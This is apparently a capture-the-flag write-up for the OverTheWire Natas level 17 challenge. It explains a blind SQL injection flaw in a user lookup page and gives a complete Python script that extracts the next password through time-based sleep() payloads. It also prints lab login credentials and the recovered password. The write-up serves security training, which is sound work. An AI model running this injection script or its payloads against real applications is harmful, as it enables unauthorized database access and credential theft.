# OverTheWire: Natas Level 17 -> Level 18 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to retrieve the password for Natas Level 18. The application features a user lookup interface. Unlike previous levels, the database execution results or detailed errors are completely hidden from the user interface. 

By analyzing the underlying logic, we observe that the application only returns two distinct environmental states based on the query outcome:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
```

Because the input is directly concatenated using double quotes (`"`) and lacks parameterization, it is highly vulnerable to SQL Injection. However, since no data is direct-rendered and the output code (`echo "This user exists.<br>";`) has been commented out, we cannot determine the password by usual Boolean-based Blind SQL Injection (as it will always display nothing). Instead, we must utilize **Time-based Blind SQL Injection** to infer the password byte by byte via server response delays.

## 2. Solution Strategy & Exploitation

### Probe & Verification:
To confirm the blind injection vector, we submit two logical inputs to the `username` field to test the quote closure:
* **Input A**: `natas18" and 1=1 #` -> Server responds: (Nothing, normal execution)
* **Input B**: `natas18" and 1=2 #` -> Server responds: (Nothing, normal execution)

Since the output remains identical, the classical Boolean-based feedback loop is broken. We must pivot to a time-based approach.

### Optimization via Time-based:
By appending `sleep(5)` to the SQL injection payload, we force the database to delay the server's response if our guess is correct. We calculate the elapsed time using `elapsed_time = time.time() - start_time`. Implementing a conditional check `if elapsed_time >= 4.5` will indicate that the tested character is indeed part of the password.

### Python Automation Script:
We exploited this SQL injection vulnerability and developed an automated Python script to perform brute-force verification.

```python
import requests 
from requests.auth import HTTPBasicAuth
import time
import string

url = "http://natas17.natas.labs.overthewire.org/"
my_auth = HTTPBasicAuth("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")
charset = string.ascii_letters + string.digits
password = ""

print("[*] Detecting password for natas18 using time-based blind SQL injection...")

for i in range(1, 33):
    for char in charset:
        ## Add "BINARY password LIKE" to ensure the database performs a case-sensitive comparison.
        ## Natas18 is a known username, thus the database will compare the password attribute one by one.
        ## If the password character matches, the 'AND' logical operator will execute the 'sleep(5)' command.
        payload = {"username": f'natas18" AND BINARY password LIKE "{password + char}%" and sleep(5) # '}
        start_time = time.time()
        
        try:
            # Set a high timeout to ensure requests don't drop during intentional server sleep
            response = requests.post(url, auth=my_auth, data=payload, timeout=7)
        except requests.exceptions.Timeout:
            pass
        
        elapsed_time = time.time() - start_time
        
        ## Determine the server response speed by elapsed_time
        if elapsed_time >= 4.5:
            password += char
            print(f"Success! Found character: {char} Current password : {password}")
            break

print(f"Password for natas18: {password}")
```

## 3. Flag / Final Result
* **Natas Level 18 Password**: `fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op`
